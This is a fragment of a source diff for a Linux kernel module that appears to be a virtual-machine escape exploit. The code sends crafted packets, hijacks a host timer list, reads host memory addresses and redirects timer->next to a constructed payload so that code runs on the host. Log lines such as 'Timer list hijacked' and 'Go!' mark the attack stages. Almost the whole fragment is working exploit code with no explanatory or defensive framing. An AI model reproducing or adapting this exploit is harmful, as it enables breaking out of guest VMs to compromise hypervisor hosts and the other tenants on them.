-        if (++i % 1000 == 0)
+        //printk("[+] i=%d, packet=%s.\n", i, packet);
+        sock_sendmsg(sock, &msg, len);
+        if (++i % 1000 == 0){
+            //printk("[+] refresh_targets: timer->expire_time=%d.\n", timer->expire_time);
             refresh_targets();
+            //break;
+        }
     }
+    sock_release(sock);
+    sock = NULL;
+
     printk("[+] Timer list hijacked. Reading highmem base...\n");
     ram_block = read_host8(timer, timer2, ADDR_RAMLIST_FIRST);
-
-
 
     printk("[+] ram_block = %016lx\n", (unsigned long int)ram_block);
     highmem_hva_base = read_host8(timer, timer2, ram_block);
@@ -984,39 +807,31 @@ static int __init server_init( void )
     printk("[+] Go!\n");
 
     //safe to here
-
-    timer->next   = gva_to_hva(construct_payload());
-
-
+    timer->next   = gva_to_hva(construct_payload_j());
     timer->expire_time = 0;
-
     //               while(1);
 
     set_fs(oldfs);
     commit_targets();
 
-
     printk("payload at hva %016lx\n",(unsigned long int)timer->next);
 
-        while (!share.done)
-	  mdelay(1000);
+    while (!share.done)
+	mdelay(1000);
     printk("[+] Done!\n");
-
-
 
     return 0;
 }
 
 static void __exit server_exit( void )
 {
-  printk("EXIT MODULE");
+    printk("EXIT MODULE");
 }
 
-  #include <asm/apic.h>
-void foo(){
-  //#define APIC ((uint64_t*)0xffffffff81668678)
-
-  apic->write(0,0);
+#include <asm/apic.h>
+void foo(void){
+    //#define APIC ((uint64_t*)0xffffffff81668678)
+    apic->write(0,0);
 }
 
 module_init(server_init);
